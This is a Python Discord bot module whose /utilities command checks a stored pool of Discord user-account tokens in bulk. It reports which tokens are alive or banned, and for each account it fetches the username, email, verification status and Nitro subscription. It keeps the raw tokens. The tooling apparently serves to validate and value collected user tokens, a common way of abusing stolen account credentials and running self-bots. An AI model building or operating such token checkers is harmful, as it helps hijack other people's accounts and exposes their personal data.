"""
/utilities <action> — per-token inspection tools.

Actions:
  info    — fetch @me for every token (username, id, nitro, flags)
  ping    — check which tokens are still valid (200 vs 401)
  nitro   — list tokens that have active Nitro subscription
  status  — overall keeper health: stored / alive / dead
"""

import asyncio
import aiohttp
import discord
from discord.ext import commands
from discord import app_commands
from utils.permissions import check_permission, channel_allowed


NITRO_TYPES = {0: "None", 1: "Classic", 2: "Nitro", 3: "Basic"}


async def _me(session: aiohttp.ClientSession, token: str) -> dict:
    try:
        async with session.get(
            "https://discord.com/api/v10/users/@me",
            headers={"Authorization": token},
            timeout=aiohttp.ClientTimeout(total=8),
        ) as r:
            if r.status == 200:
                d = await r.json()
                return {
                    "ok": True,
                    "id": d.get("id"),
                    "username": d.get("username"),
                    "discriminator": d.get("discriminator", "0"),
                    "email": d.get("email"),
                    "nitro": d.get("premium_type", 0),
                    "verified": d.get("verified", False),
                    "token": token[:10],
                    "raw_token": token,
                }
            return {"ok": False, "status": r.status, "token": token[:10]}
    except Exception as e:
        return {"ok": False, "msg": str(e), "token": token[:10]}


class UtilitiesCommands(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @app_commands.command(name="utilities", description="Token utility tools")
    @app_commands.describe(
        action="info | ping | nitro | status",
        limit="Max tokens to check (default: all)",
    )
    async def utilities(
        self,
        interaction: discord.Interaction,
        action: str,
        limit: int | None = None,
    ):
        if not channel_allowed(interaction.channel_id):
            return await interaction.response.send_message("❌ Wrong channel.", ephemeral=True)
        if not check_permission(
            interaction.user.id,
            interaction.guild.owner_id if interaction.guild else None,
        ):
            return await interaction.response.send_message("❌ No permission.", ephemeral=True)

        action = action.lower().strip()
        tm = self.bot.token_manager

        # ── status ─────────────────────────────────────────────────────
        if action == "status":
            embed = discord.Embed(title="📡 Keeper Status", color=0x5865F2)
            embed.add_field(name="Stored Tokens", value=str(tm.get_count()), inline=True)
            embed.add_field(name="Alive Sessions", value=str(tm.alive_count()), inline=True)
            dead = tm.get_count() - tm.alive_count()
            embed.add_field(name="Idle (not keeping)", value=str(dead), inline=True)
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        # ── ping ───────────────────────────────────────────────────────
        elif action == "ping":
            tokens = tm.get_all()
            if not tokens:
                return await interaction.response.send_message("❌ No tokens.", ephemeral=True)
            using = tokens[:limit] if limit else tokens

            await interaction.response.defer(ephemeral=True)

            async with aiohttp.ClientSession() as sess:
                results = await asyncio.gather(*[_me(sess, t) for t in using])

            valid = [r for r in results if r["ok"]]
            dead = [r for r in results if not r["ok"]]

            embed = discord.Embed(title="🏓 Token Ping", color=0x57F287 if not dead else 0xFEE75C)
            embed.add_field(name="Valid", value=str(len(valid)), inline=True)
            embed.add_field(name="Dead/Banned", value=str(len(dead)), inline=True)
            embed.add_field(name="Checked", value=str(len(using)), inline=True)

            if dead:
                embed.add_field(
                    name="Dead tokens (first 5)",
                    value="\n".join(f"`{r['token']}...`" for r in dead[:5]),
                    inline=False,
                )
            return await interaction.followup.send(embed=embed, ephemeral=True)

        # ── info ───────────────────────────────────────────────────────
        elif action == "info":
            tokens = tm.get_all()
            if not tokens:
                return await interaction.response.send_message("❌ No tokens.", ephemeral=True)
            using = tokens[: min(limit or 15, 15)]  # cap at 15 for embed size

            await interaction.response.defer(ephemeral=True)

            async with aiohttp.ClientSession() as sess:
                results = await asyncio.gather(*[_me(sess, t) for t in using])

            embed = discord.Embed(
                title=f"🔍 Token Info ({len(using)} checked)",
                color=0x5865F2,
            )
            lines: list[str] = []
            for r in results:
                if r["ok"]:
                    tag = f"{r['username']}#{r['discriminator']}" if r.get("discriminator") != "0" else r["username"]
                    nitro = NITRO_TYPES.get(r["nitro"], "?")
                    v = "✅" if r["verified"] else "❌"
                    lines.append(f"`{r['token']}...` — **{tag}** | Nitro: {nitro} | Verified: {v}")
                else:
                    lines.append(f"`{r['token']}...` — ❌ dead/invalid")

            # chunk to avoid embed limit
            chunk = "\n".join(lines[:10])
            embed.description = chunk
            if len(lines) > 10:
                embed.set_footer(text=f"Showing 10 of {len(lines)}. Increase limit or use /token list.")
            return await interaction.followup.send(embed=embed, ephemeral=True)

        # ── nitro ──────────────────────────────────────────────────────
        elif action == "nitro":
            tokens = tm.get_all()
            if not tokens:
                return await interaction.response.send_message("❌ No tokens.", ephemeral=True)
            using = tokens[:limit] if limit else tokens

            await interaction.response.defer(ephemeral=True)

            async with aiohttp.ClientSession() as sess:
                results = await asyncio.gather(*[_me(sess, t) for t in using])

            nitro_tokens = [r for r in results if r.get("ok") and r.get("nitro", 0) > 0]

            embed = discord.Embed(title="💎 Nitro Tokens", color=0x9B59B6)
            embed.add_field(name="With Nitro", value=str(len(nitro_tokens)), inline=True)
            embed.add_field(name="Checked", value=str(len(using)), inline=True)

            if nitro_tokens:
                lines = []
                for r in nitro_tokens[:10]:
                    tag = f"{r['username']}#{r['discriminator']}" if r.get("discriminator") != "0" else r["username"]
                    nitro_name = NITRO_TYPES.get(r["nitro"], "?")
                    lines.append(f"`{r['token']}...` — {tag} — {nitro_name}")
                embed.add_field(name="Accounts", value="\n".join(lines), inline=False)
            else:
                embed.description = "No Nitro tokens found."

            return await interaction.followup.send(embed=embed, ephemeral=True)

        else:
            return await interaction.response.send_message(
                "❌ Unknown action. Use: `info | ping | nitro | status`",
                ephemeral=True,
            )


async def setup(bot: commands.Bot):
    await bot.add_cog(UtilitiesCommands(bot))
